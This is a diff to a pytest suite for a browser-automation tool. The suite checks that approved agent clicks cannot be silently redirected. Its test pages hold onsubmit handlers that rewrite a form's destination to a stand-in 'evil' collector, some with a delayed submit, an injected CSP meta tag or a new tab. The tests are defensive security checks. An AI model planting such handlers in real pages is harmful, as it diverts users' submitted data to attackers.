@@ -52,19 +52,33 @@ def _with_collector():
     return server, f'http://127.0.0.1:{server.server_port}'
 
 
-async def _context(socket_url, url, tool, build_args):
+async def _context(socket_url, url, tool, build_args, *, visual=False):
+    """Authorize one observed action and retain its independently checked outcome."""
     async with websockets.connect(socket_url, origin='http://localhost') as socket:
         bridge = RealCDPBridge(socket)
         tools = BrowserTools(bridge)
         try:
-            await tools.call('navigate_page', {'url': url, 'includeSnapshot': False})
-            await tools.call('take_snapshot', {})
+            navigation = await tools.call('navigate_page', {'pageId': 1, 'url': url, 'includeSnapshot': False})
+            assert bridge.url == url, navigation.lines
+            snapshot = await tools.call('take_snapshot', {'pageId': 1})
             session = tools.pages.session(7)
-            uid = lambda name: next(n.uid for n in session.nodes.values() if n.name == name)
-            args = await build_args(bridge, uid)
+
+            def uid(name):
+                """Include the actual page state when a fixture target is missing."""
+                match = next((n.uid for n in session.nodes.values() if n.name == name), None)
+                assert match is not None, (name, navigation.lines, snapshot.lines, session.frames)
+                return match
+
+            args = {"pageId": 1, **await build_args(bridge, uid)}
+            if visual:
+                screenshot = await tools.call('take_screenshot', {'pageId': 1})
+                point = await bridge.evaluate("(() => {const r=document.querySelector('button').getBoundingClientRect(); return {x:r.x+r.width/2,y:r.y+r.height/2};})()")
+                args.pop('uid')
+                args['visual_target'] = {'screenshot_id': screenshot.structured_content['visual_binding']['screenshot_id'], **point}
             context = (await tools.call('__monaw_action_context', {'tool_name': tool, 'arguments': args})).structured_content['browser_action_context']
-            await tools.call(tool, {**args, '__monaw_authorization': context})
+            output = await tools.call(tool, {**args, '__monaw_authorization': context})
             await asyncio.sleep(1.5)
+            context['outcome'] = output.action_outcome
             return context
         finally:
             bridge.reader.cancel()
@@ -106,19 +120,45 @@ def test_link_ping_destination_is_disclosed(tmp_path):
         collector.server_close()
 
 
-@pytest.mark.xfail(strict=True, reason='Known gap: a submit handler can change the destination after approval. '
-                   'Needs request-level enforcement during the approved action.')
-def test_onsubmit_rewrite_after_approval_is_reported(tmp_path):
+@pytest.mark.parametrize('method,handler', [
+    ('post', "this.action = '{evil}/rewritten'"),
+    ('get', "this.action = '{evil}/rewritten'"),
+    ('post', "event.preventDefault(); setTimeout(() => {{ this.action = '{evil}/delayed'; this.submit(); }}, 350)"),
+    ('post', "const m = document.createElement('meta'); m.httpEquiv = 'Content-Security-Policy'; m.content = 'form-action *'; document.head.append(m); this.target = '_blank'; this.action = '{evil}/popup'"),
+])
+def test_onsubmit_rewrite_after_approval_is_blocked(tmp_path, method, handler):
+    """Native navigation policy survives handlers, delayed submits and new tabs."""
     collector, evil = _with_collector()
     try:
-        html = lambda _path: f'''<!doctype html><form action=/save method=post
-          onsubmit="this.setAttribute('action','{evil}/rewritten')"><input name=q aria-label="Query">
+        html = lambda _path: f'''<!doctype html><form action=/save method={method}
+          onsubmit="{handler.format(evil=evil)}"><input name=q aria-label="Query">
           <button type=submit>Save</button></form>'''
         with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
             async def click(bridge, uid):
                 return {'uid': uid('Save'), 'includeSnapshot': False}
             context = asyncio.run(_context(socket_url, url, 'click', click))
-        assert not _Collector.hits or context['destination'].startswith(evil), (context['destination'], _Collector.hits)
+        assert _Collector.hits == [], (context['destination'], _Collector.hits)
+        if 'setTimeout' not in handler:
+            assert context['outcome']['verification']['type'] == 'form_destination'
+            assert context['outcome']['status'] == 'failed'
+    finally:
+        collector.shutdown()
+        collector.server_close()
+
+
+@pytest.mark.parametrize('visual', [False, True])
+def test_approved_form_destination_still_receives_submission(tmp_path, visual):
+    """The same guard permits the reviewed cross-origin form submission."""
+    collector, approved = _with_collector()
+    try:
+        html = lambda _path: f'''<!doctype html><form action="{approved}/approved" method=post>
+          <input name=q value=test><button type=submit>Save</button></form>'''
+        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
+            async def click(bridge, uid):
+                """Use the freshly observed button as the exact action target."""
+                return {'uid': uid('Save'), 'includeSnapshot': False}
+            asyncio.run(_context(socket_url, url, 'click', click, visual=visual))
+        assert _Collector.hits == ['/approved']
     finally:
         collector.shutdown()
         collector.server_close()
